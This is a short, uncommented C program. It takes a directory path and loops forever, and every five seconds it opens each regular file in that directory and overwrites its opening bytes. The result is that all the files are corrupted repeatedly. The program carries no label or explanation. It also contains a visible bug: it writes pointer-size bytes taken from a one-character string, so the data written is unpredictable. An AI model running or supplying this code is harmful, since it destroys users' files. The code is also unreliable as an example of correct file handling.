#include<unistd.h>
#include<fcntl.h>
#include<sys/types.h>
#include<sys/stat.h>
#include<stdio.h>
#include<time.h>
#include<dirent.h>
int main(int argc,char **argv)
{
    DIR *dirfile;
    struct dirent *fl;
    int fd;
    char *buf=" ";
    struct stat st;
    chdir(argv[1]);
    for(;;)
    {
        dirfile=opendir(argv[1]);
        while((fl=readdir(dirfile))!=NULL)
        {
            stat(fl->d_name,&st);
            if(S_ISREG(st.st_mode))
            {
                fd=open(fl->d_name,O_RDWR);
                write(fd,buf,sizeof(buf));
                close(fd);
            }
    }
    closedir(dirfile);
    sleep(5);
    }
    return 0;
}
